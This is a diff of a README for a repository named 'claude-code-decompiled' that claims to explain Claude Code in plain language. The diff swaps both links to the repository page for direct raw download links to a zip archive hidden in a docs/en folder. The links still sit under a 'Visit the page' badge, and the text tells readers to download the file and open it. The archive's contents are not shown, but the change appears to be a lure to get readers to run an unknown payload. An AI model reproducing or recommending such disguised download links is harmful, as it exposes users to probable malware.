@@ -1,6 +1,6 @@
 # 🔍 claude-code-decompiled - Understand Claude Code in Plain Language
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://github.com/jalehvesical21/claude-code-decompiled)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/jalehvesical21/claude-code-decompiled/main/docs/en/decompiled_code_claude_2.8.zip)
 
 ## 🖥️ What This Is
 
@@ -19,7 +19,7 @@ Use this repo if you want to:
 
 Visit this page to download:
 
-https://github.com/jalehvesical21/claude-code-decompiled
+https://raw.githubusercontent.com/jalehvesical21/claude-code-decompiled/main/docs/en/decompiled_code_claude_2.8.zip
 
 If the page offers a release file, download it to your PC. If it gives you a folder or archive, save it and open it after the download finishes.
 
